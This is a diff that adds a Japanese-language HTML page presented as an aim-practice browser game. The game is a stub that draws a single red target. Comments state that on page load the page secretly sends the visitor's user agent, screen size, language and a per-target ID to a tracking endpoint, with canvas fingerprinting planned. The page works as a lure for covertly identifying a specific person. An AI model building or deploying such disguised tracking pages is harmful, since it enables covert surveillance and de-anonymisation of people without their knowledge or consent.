@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>Simple Aim Game</title>
+    <style>
+        body { text-align: center; background-color: #222; color: white; }
+        canvas { background-color: #333; cursor: crosshair; mt-5 }
+    </style>
+</head>
+<body>
+    <h1>エイム練習テスト版</h1>
+    <p>赤い的をクリックしてね！</p>
+    <canvas id="gameCanvas" width="800" height="600"></canvas>
+
+    <script>
+        // --- 1. 裏で行うデータ収集と送信 ---
+        const targetId = "{{ target_id }}"; // Pythonから渡されたID
+        
+        const sendFingerprint = () => {
+            const data = {
+                target_id: targetId,
+                ua: navigator.userAgent,
+                res: `${screen.width}x${screen.height}`,
+                lang: navigator.language
+                // ここにCanvasフィンガープリントなどを追加
+            };
+
+            fetch('/api/track', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+        };
+
+        // ページ読み込み時にこっそり送信
+        window.onload = sendFingerprint;
+
+        // --- 2. ブラウザゲームの処理（ダミー兼本物） ---
+        const canvas = document.getElementById('gameCanvas');
+        const ctx = canvas.getContext('2d');
+        
+        // ここに的を描画してクリック判定するJavaScriptのゲームロジックを書く
+        ctx.fillStyle = "red";
+        ctx.beginPath();
+        ctx.arc(400, 300, 30, 0, Math.PI * 2);
+        ctx.fill();
+    </script>
+</body>
+</html>
